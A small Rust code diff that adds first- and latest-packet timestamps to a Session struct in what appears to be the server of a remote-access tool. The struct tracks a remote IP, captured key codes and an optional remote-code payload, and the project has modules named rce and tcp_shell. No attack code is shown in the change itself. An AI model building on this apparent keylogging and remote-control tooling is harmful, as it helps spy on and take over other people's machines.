@@ -3,6 +3,7 @@ pub mod dns_proxy;
 pub mod grpc;
 pub mod rce;
 pub mod tcp_shell;
+use chrono::{DateTime, Utc};
 pub mod tamanoir_grpc {
     tonic::include_proto!("tamanoir");
 }
@@ -107,15 +108,19 @@ pub struct Session {
     pub ip: Ipv4Addr,
     pub key_codes: Vec<u8>,
     pub rce_payload: Option<SessionRcePayload>,
+    pub first_packet: DateTime<Utc>,
+    pub latest_packet: DateTime<Utc>,
 }
 impl Session {
     pub fn new(sock_addr: SocketAddr) -> Option<Self> {
+        let now_utc = Utc::now();
         match sock_addr {
             SocketAddr::V4(addr) => Some(Session {
                 ip: *addr.ip(),
-
                 key_codes: vec![],
                 rce_payload: None,
+                first_packet: now_utc,
+                latest_packet: now_utc,
             }),
             _ => None,
         }
